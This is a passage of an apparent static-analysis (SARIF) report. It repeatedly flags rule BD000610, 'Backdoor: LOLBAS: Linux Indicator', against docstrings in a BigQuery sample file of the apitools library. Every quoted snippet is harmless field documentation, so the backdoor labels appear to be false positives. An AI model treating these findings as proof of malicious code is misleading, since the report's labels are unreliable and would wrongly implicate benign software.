                      "markdown": "`    extract: [Output-only] Statistics for an extract job.\n    load: [Output-only] Statistics for a load job.\n    query: [Output-only] Statistics for a query job.\n    startTime: [Output-only] Start time of this job, in milliseconds since the\n      epoch. This field will be present when the job transitions from the\n      PENDING state to either RUNNING or DONE.\n    totalBytesProcessed: [Output-only] [Deprecated] Use the bytes processed in\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1397,
                  "startColumn": 30,
                  "endLine": 1397,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  Fields:\n    creationTime: [Output-only] Creation time of this job, in milliseconds\n      since the epoch. This field will be present on all jobs.\n    endTime: [Output-only] End time of this job, in milliseconds since the\n      epoch. This field will be present whenever a job is in the DONE state.\n    extract: [Output-only] Statistics for an extract job.\n    load: [Output-only] Statistics for a load job.\n",
                    "rendered": {
                      "text": "  Fields:\n    creationTime: [Output-only] Creation time of this job, in milliseconds\n      since the epoch. This field will be present on all jobs.\n    endTime: [Output-only] End time of this job, in milliseconds since the\n      epoch. This field will be present whenever a job is in the DONE state.\n    extract: [Output-only] Statistics for an extract job.\n    load: [Output-only] Statistics for a load job.\n",
                      "markdown": "`  Fields:\n    creationTime: [Output-only] Creation time of this job, in milliseconds\n      since the epoch. This field will be present on all jobs.\n    endTime: [Output-only] End time of this job, in milliseconds since the\n      epoch. This field will be present whenever a job is in the DONE state.\n    extract: [Output-only] Statistics for an extract job.\n    load: [Output-only] Statistics for a load job.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1395,
                  "startColumn": 40,
                  "endLine": 1395,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  r\"\"\"A JobStatistics object.\n\n  Fields:\n    creationTime: [Output-only] Creation time of this job, in milliseconds\n      since the epoch. This field will be present on all jobs.\n    endTime: [Output-only] End time of this job, in milliseconds since the\n      epoch. This field will be present whenever a job is in the DONE state.\n",
                    "rendered": {
                      "text": "  r\"\"\"A JobStatistics object.\n\n  Fields:\n    creationTime: [Output-only] Creation time of this job, in milliseconds\n      since the epoch. This field will be present on all jobs.\n    endTime: [Output-only] End time of this job, in milliseconds since the\n      epoch. This field will be present whenever a job is in the DONE state.\n",
                      "markdown": "`  r\"\"\"A JobStatistics object.\n\n  Fields:\n    creationTime: [Output-only] Creation time of this job, in milliseconds\n      since the epoch. This field will be present on all jobs.\n    endTime: [Output-only] End time of this job, in milliseconds since the\n      epoch. This field will be present whenever a job is in the DONE state.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1355,
                  "startColumn": 23,
                  "endLine": 1355,
                  "endColumn": 29,
                  "snippet": {
                    "text": "      state: Running state of the job. When the state is DONE, errorResult can\n        be checked to determine whether the job succeeded or failed.\n      statistics: [Output-only] Information about the job, including starting\n        time and ending time of the job.\n      status: [Full-projection-only] Describes the state of the job.\n      user_email: [Full-projection-only] Email address of the user who ran the\n        job.\n",
                    "rendered": {
                      "text": "      state: Running state of the job. When the state is DONE, errorResult can\n        be checked to determine whether the job succeeded or failed.\n      statistics: [Output-only] Information about the job, including starting\n        time and ending time of the job.\n      status: [Full-projection-only] Describes the state of the job.\n      user_email: [Full-projection-only] Email address of the user who ran the\n        job.\n",
                      "markdown": "`      state: Running state of the job. When the state is DONE, errorResult can\n        be checked to determine whether the job succeeded or failed.\n      statistics: [Output-only] Information about the job, including starting\n        time and ending time of the job.\n      status: [Full-projection-only] Describes the state of the job.\n      user_email: [Full-projection-only] Email address of the user who ran the\n        job.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1355,
                  "startColumn": 7,
                  "endLine": 1355,
                  "endColumn": 13,
                  "snippet": {
                    "text": "      state: Running state of the job. When the state is DONE, errorResult can\n        be checked to determine whether the job succeeded or failed.\n      statistics: [Output-only] Information about the job, including starting\n        time and ending time of the job.\n      status: [Full-projection-only] Describes the state of the job.\n      user_email: [Full-projection-only] Email address of the user who ran the\n        job.\n",
                    "rendered": {
                      "text": "      state: Running state of the job. When the state is DONE, errorResult can\n        be checked to determine whether the job succeeded or failed.\n      statistics: [Output-only] Information about the job, including starting\n        time and ending time of the job.\n      status: [Full-projection-only] Describes the state of the job.\n      user_email: [Full-projection-only] Email address of the user who ran the\n        job.\n",
                      "markdown": "`      state: Running state of the job. When the state is DONE, errorResult can\n        be checked to determine whether the job succeeded or failed.\n      statistics: [Output-only] Information about the job, including starting\n        time and ending time of the job.\n      status: [Full-projection-only] Describes the state of the job.\n      user_email: [Full-projection-only] Email address of the user who ran the\n        job.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1128,
                  "startColumn": 57,
                  "endLine": 1128,
                  "endColumn": 62,
                  "snippet": {
                    "text": "      ALLOW_FIELD_ADDITION: allow adding a nullable field to the schema.\n      ALLOW_FIELD_RELAXATION: allow relaxing a required field in the original\n      schema to nullable.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when loading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n",
                    "rendered": {
                      "text": "      ALLOW_FIELD_ADDITION: allow adding a nullable field to the schema.\n      ALLOW_FIELD_RELAXATION: allow relaxing a required field in the original\n      schema to nullable.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when loading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n",
                      "markdown": "`      ALLOW_FIELD_ADDITION: allow adding a nullable field to the schema.\n      ALLOW_FIELD_RELAXATION: allow relaxing a required field in the original\n      schema to nullable.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when loading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 972,
                  "startColumn": 21,
                  "endLine": 972,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    selfLink: [Output-only] A URL that can be used to access this resource\n      again.\n    statistics: [Output-only] Information about the job, including starting\n      time and ending time of the job.\n    status: [Output-only] The status of this job. Examine this value when\n      polling an asynchronous job to see if the job is complete.\n    user_email: [Output-only] Email address of the user who ran the job.\n",
                    "rendered": {
                      "text": "    selfLink: [Output-only] A URL that can be used to access this resource\n      again.\n    statistics: [Output-only] Information about the job, including starting\n      time and ending time of the job.\n    status: [Output-only] The status of this job. Examine this value when\n      polling an asynchronous job to see if the job is complete.\n    user_email: [Output-only] Email address of the user who ran the job.\n",
                      "markdown": "`    selfLink: [Output-only] A URL that can be used to access this resource\n      again.\n    statistics: [Output-only] Information about the job, including starting\n      time and ending time of the job.\n    status: [Output-only] The status of this job. Examine this value when\n      polling an asynchronous job to see if the job is complete.\n    user_email: [Output-only] Email address of the user who ran the job.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 972,
                  "startColumn": 5,
                  "endLine": 972,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    selfLink: [Output-only] A URL that can be used to access this resource\n      again.\n    statistics: [Output-only] Information about the job, including starting\n      time and ending time of the job.\n    status: [Output-only] The status of this job. Examine this value when\n      polling an asynchronous job to see if the job is complete.\n    user_email: [Output-only] Email address of the user who ran the job.\n",
                    "rendered": {
                      "text": "    selfLink: [Output-only] A URL that can be used to access this resource\n      again.\n    statistics: [Output-only] Information about the job, including starting\n      time and ending time of the job.\n    status: [Output-only] The status of this job. Examine this value when\n      polling an asynchronous job to see if the job is complete.\n    user_email: [Output-only] Email address of the user who ran the job.\n",
                      "markdown": "`    selfLink: [Output-only] A URL that can be used to access this resource\n      again.\n    statistics: [Output-only] Information about the job, including starting\n      time and ending time of the job.\n    status: [Output-only] The status of this job. Examine this value when\n      polling an asynchronous job to see if the job is complete.\n    user_email: [Output-only] Email address of the user who ran the job.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 942,
                  "startColumn": 57,
                  "endLine": 942,
                  "endColumn": 62,
                  "snippet": {
                    "text": "  r\"\"\"A GoogleSheetsOptions object.\n\n  Fields:\n    skipLeadingRows: [Optional] The number of rows at the top of a sheet that\n      BigQuery will skip when reading the data. The default value is 0. This\n      property is useful if you have header rows that should be skipped. When\n      autodetect is on, behavior is the following: * skipLeadingRows\n",
                    "rendered": {
                      "text": "  r\"\"\"A GoogleSheetsOptions object.\n\n  Fields:\n    skipLeadingRows: [Optional] The number of rows at the top of a sheet that\n      BigQuery will skip when reading the data. The default value is 0. This\n      property is useful if you have header rows that should be skipped. When\n      autodetect is on, behavior is the following: * skipLeadingRows\n",
                      "markdown": "`  r\"\"\"A GoogleSheetsOptions object.\n\n  Fields:\n    skipLeadingRows: [Optional] The number of rows at the top of a sheet that\n      BigQuery will skip when reading the data. The default value is 0. This\n      property is useful if you have header rows that should be skipped. When\n      autodetect is on, behavior is the following: * skipLeadingRows\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 794,
                  "startColumn": 37,
                  "endLine": 794,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      be scheduled.\n    writeRatioAvg: Relative amount of time the average shard spent on writing\n      output.\n    writeRatioMax: Relative amount of time the slowest shard spent on writing\n      output.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      be scheduled.\n    writeRatioAvg: Relative amount of time the average shard spent on writing\n      output.\n    writeRatioMax: Relative amount of time the slowest shard spent on writing\n      output.\n  \"\"\"\n\n",
                      "markdown": "`      be scheduled.\n    writeRatioAvg: Relative amount of time the average shard spent on writing\n      output.\n    writeRatioMax: Relative amount of time the slowest shard spent on writing\n      output.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 792,
                  "startColumn": 37,
                  "endLine": 792,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      be scheduled.\n    waitRatioMax: Relative amount of time the slowest shard spent waiting to\n      be scheduled.\n    writeRatioAvg: Relative amount of time the average shard spent on writing\n      output.\n    writeRatioMax: Relative amount of time the slowest shard spent on writing\n      output.\n",
                    "rendered": {
                      "text": "      be scheduled.\n    waitRatioMax: Relative amount of time the slowest shard spent waiting to\n      be scheduled.\n    writeRatioAvg: Relative amount of time the average shard spent on writing\n      output.\n    writeRatioMax: Relative amount of time the slowest shard spent on writing\n      output.\n",
                      "markdown": "`      be scheduled.\n    waitRatioMax: Relative amount of time the slowest shard spent waiting to\n      be scheduled.\n    writeRatioAvg: Relative amount of time the average shard spent on writing\n      output.\n    writeRatioMax: Relative amount of time the slowest shard spent on writing\n      output.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 790,
                  "startColumn": 36,
                  "endLine": 790,
                  "endColumn": 42,
                  "snippet": {
                    "text": "      (approximately chronological).\n    waitRatioAvg: Relative amount of time the average shard spent waiting to\n      be scheduled.\n    waitRatioMax: Relative amount of time the slowest shard spent waiting to\n      be scheduled.\n    writeRatioAvg: Relative amount of time the average shard spent on writing\n      output.\n",
                    "rendered": {
                      "text": "      (approximately chronological).\n    waitRatioAvg: Relative amount of time the average shard spent waiting to\n      be scheduled.\n    waitRatioMax: Relative amount of time the slowest shard spent waiting to\n      be scheduled.\n    writeRatioAvg: Relative amount of time the average shard spent on writing\n      output.\n",
                      "markdown": "`      (approximately chronological).\n    waitRatioAvg: Relative amount of time the average shard spent waiting to\n      be scheduled.\n    waitRatioMax: Relative amount of time the slowest shard spent waiting to\n      be scheduled.\n    writeRatioAvg: Relative amount of time the average shard spent on writing\n      output.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 788,
                  "startColumn": 36,
                  "endLine": 788,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    recordsWritten: Number of records written by the stage.\n    steps: List of operations within the stage in dependency order\n      (approximately chronological).\n    waitRatioAvg: Relative amount of time the average shard spent waiting to\n      be scheduled.\n    waitRatioMax: Relative amount of time the slowest shard spent waiting to\n      be scheduled.\n",
                    "rendered": {
                      "text": "    recordsWritten: Number of records written by the stage.\n    steps: List of operations within the stage in dependency order\n      (approximately chronological).\n    waitRatioAvg: Relative amount of time the average shard spent waiting to\n      be scheduled.\n    waitRatioMax: Relative amount of time the slowest shard spent waiting to\n      be scheduled.\n",
                      "markdown": "`    recordsWritten: Number of records written by the stage.\n    steps: List of operations within the stage in dependency order\n      (approximately chronological).\n    waitRatioAvg: Relative amount of time the average shard spent waiting to\n      be scheduled.\n    waitRatioMax: Relative amount of time the slowest shard spent waiting to\n      be scheduled.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 782,
                  "startColumn": 36,
                  "endLine": 782,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    name: Human-readable name for stage.\n    readRatioAvg: Relative amount of time the average shard spent reading\n      input.\n    readRatioMax: Relative amount of time the slowest shard spent reading\n      input.\n    recordsRead: Number of records read into the stage.\n    recordsWritten: Number of records written by the stage.\n",
                    "rendered": {
                      "text": "    name: Human-readable name for stage.\n    readRatioAvg: Relative amount of time the average shard spent reading\n      input.\n    readRatioMax: Relative amount of time the slowest shard spent reading\n      input.\n    recordsRead: Number of records read into the stage.\n    recordsWritten: Number of records written by the stage.\n",
                      "markdown": "`    name: Human-readable name for stage.\n    readRatioAvg: Relative amount of time the average shard spent reading\n      input.\n    readRatioMax: Relative amount of time the slowest shard spent reading\n      input.\n    recordsRead: Number of records read into the stage.\n    recordsWritten: Number of records written by the stage.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 780,
                  "startColumn": 36,
                  "endLine": 780,
                  "endColumn": 42,
                  "snippet": {
                    "text": "      bound tasks.\n    id: Unique ID for stage within plan.\n    name: Human-readable name for stage.\n    readRatioAvg: Relative amount of time the average shard spent reading\n      input.\n    readRatioMax: Relative amount of time the slowest shard spent reading\n      input.\n",
                    "rendered": {
                      "text": "      bound tasks.\n    id: Unique ID for stage within plan.\n    name: Human-readable name for stage.\n    readRatioAvg: Relative amount of time the average shard spent reading\n      input.\n    readRatioMax: Relative amount of time the slowest shard spent reading\n      input.\n",
                      "markdown": "`      bound tasks.\n    id: Unique ID for stage within plan.\n    name: Human-readable name for stage.\n    readRatioAvg: Relative amount of time the average shard spent reading\n      input.\n    readRatioMax: Relative amount of time the slowest shard spent reading\n      input.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 776,
                  "startColumn": 39,
                  "endLine": 776,
                  "endColumn": 45,
                  "snippet": {
                    "text": "  Fields:\n    computeRatioAvg: Relative amount of time the average shard spent on CPU-\n      bound tasks.\n    computeRatioMax: Relative amount of time the slowest shard spent on CPU-\n      bound tasks.\n    id: Unique ID for stage within plan.\n    name: Human-readable name for stage.\n",
                    "rendered": {
                      "text": "  Fields:\n    computeRatioAvg: Relative amount of time the average shard spent on CPU-\n      bound tasks.\n    computeRatioMax: Relative amount of time the slowest shard spent on CPU-\n      bound tasks.\n    id: Unique ID for stage within plan.\n    name: Human-readable name for stage.\n",
                      "markdown": "`  Fields:\n    computeRatioAvg: Relative amount of time the average shard spent on CPU-\n      bound tasks.\n    computeRatioMax: Relative amount of time the slowest shard spent on CPU-\n      bound tasks.\n    id: Unique ID for stage within plan.\n    name: Human-readable name for stage.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 774,
                  "startColumn": 39,
                  "endLine": 774,
                  "endColumn": 45,
                  "snippet": {
                    "text": "  r\"\"\"A ExplainQueryStage object.\n\n  Fields:\n    computeRatioAvg: Relative amount of time the average shard spent on CPU-\n      bound tasks.\n    computeRatioMax: Relative amount of time the slowest shard spent on CPU-\n      bound tasks.\n",
                    "rendered": {
                      "text": "  r\"\"\"A ExplainQueryStage object.\n\n  Fields:\n    computeRatioAvg: Relative amount of time the average shard spent on CPU-\n      bound tasks.\n    computeRatioMax: Relative amount of time the slowest shard spent on CPU-\n      bound tasks.\n",
                      "markdown": "`  r\"\"\"A ExplainQueryStage object.\n\n  Fields:\n    computeRatioAvg: Relative amount of time the average shard spent on CPU-\n      bound tasks.\n    computeRatioMax: Relative amount of time the slowest shard spent on CPU-\n      bound tasks.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 560,
                  "startColumn": 50,
                  "endLine": 560,
                  "endColumn": 56,
                  "snippet": {
                    "text": "      is reached, that table will be deleted automatically. If a table's\n      expirationTime is modified or removed before the table expires, or if\n      you provide an explicit expirationTime when creating a table, that value\n      takes precedence over the default expiration time indicated by this\n      property.\n    description: [Optional] A user-friendly description of the dataset.\n    etag: [Output-only] A hash of the resource.\n",
                    "rendered": {
                      "text": "      is reached, that table will be deleted automatically. If a table's\n      expirationTime is modified or removed before the table expires, or if\n      you provide an explicit expirationTime when creating a table, that value\n      takes precedence over the default expiration time indicated by this\n      property.\n    description: [Optional] A user-friendly description of the dataset.\n    etag: [Output-only] A hash of the resource.\n",
                      "markdown": "`      is reached, that table will be deleted automatically. If a table's\n      expirationTime is modified or removed before the table expires, or if\n      you provide an explicit expirationTime when creating a table, that value\n      takes precedence over the default expiration time indicated by this\n      property.\n    description: [Optional] A user-friendly description of the dataset.\n    etag: [Output-only] A hash of the resource.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 554,
                  "startColumn": 70,
                  "endLine": 555,
                  "snippet": {
                    "text": "defaultTableExpirationMs: [Optional] The default lifetime of all tables in\n      the dataset, in milliseconds. The minimum value is 3600000 milliseconds\n      (one hour). Once this property is set, all newly-created tables in the\n      dataset will have an expirationTime property set to the creation time\n      plus the value in this property, and changing the value will only affect\n      new tables, not existing ones. When the expirationTime for a given table\n      is reached, that table will be deleted automatically. If a table's\n      expirationTime is modified or removed before the table expires,",
                    "rendered": {
                      "text": "defaultTableExpirationMs: [Optional] The default lifetime of all tables in\n      the dataset, in milliseconds. The minimum value is 3600000 milliseconds\n      (one hour). Once this property is set, all newly-created tables in the\n      dataset will have an expirationTime property set to the creation time\n      plus the value in this property, and changing the value will only affect\n      new tables, not existing ones. When the expirationTime for a given table\n      is reached, that table will be deleted automatically. If a table's\n      expirationTime is modified or removed before the table expires,",
                      "markdown": "`defaultTableExpirationMs: [Optional] The default lifetime of all tables in\n      the dataset, in milliseconds. The minimum value is 3600000 milliseconds\n      (one hour). Once this property is set, all newly-created tables in the\n      dataset will have an expirationTime property set to the creation time\n      plus the value in this property, and changing the value will only affect\n      new tables, not existing ones. When the expirationTime for a given table\n      is reached, that table will be deleted automatically. If a table's\n      expirationTime is modified or removed before the table expires,`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 548,
                  "startColumn": 35,
                  "endLine": 548,
                  "endColumn": 41,
                  "snippet": {
                    "text": "      access.role: READER; access.specialGroup: projectWriters; access.role:\n      WRITER; access.specialGroup: projectOwners; access.role: OWNER;\n      access.userByEmail: [dataset creator email]; access.role: OWNER;\n    creationTime: [Output-only] The time when this dataset was created, in\n      milliseconds since the epoch.\n    datasetReference: [Required] A reference that identifies the dataset.\n    defaultTableExpirationMs: [Optional] The default lifetime of all tables in\n",
                    "rendered": {
                      "text": "      access.role: READER; access.specialGroup: projectWriters; access.role:\n      WRITER; access.specialGroup: projectOwners; access.role: OWNER;\n      access.userByEmail: [dataset creator email]; access.role: OWNER;\n    creationTime: [Output-only] The time when this dataset was created, in\n      milliseconds since the epoch.\n    datasetReference: [Required] A reference that identifies the dataset.\n    defaultTableExpirationMs: [Optional] The default lifetime of all tables in\n",
                      "markdown": "`      access.role: READER; access.specialGroup: projectWriters; access.role:\n      WRITER; access.specialGroup: projectOwners; access.role: OWNER;\n      access.userByEmail: [dataset creator email]; access.role: OWNER;\n    creationTime: [Output-only] The time when this dataset was created, in\n      milliseconds since the epoch.\n    datasetReference: [Required] A reference that identifies the dataset.\n    defaultTableExpirationMs: [Optional] The default lifetime of all tables in\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 511,
                  "startColumn": 57,
                  "endLine": 511,
                  "endColumn": 62,
                  "snippet": {
                    "text": "      does not contain quoted sections, set the property value to an empty\n      string. If your data contains quoted newline characters, you must also\n      set the allowQuotedNewlines property to true.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when reading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n",
                    "rendered": {
                      "text": "      does not contain quoted sections, set the property value to an empty\n      string. If your data contains quoted newline characters, you must also\n      set the allowQuotedNewlines property to true.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when reading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n",
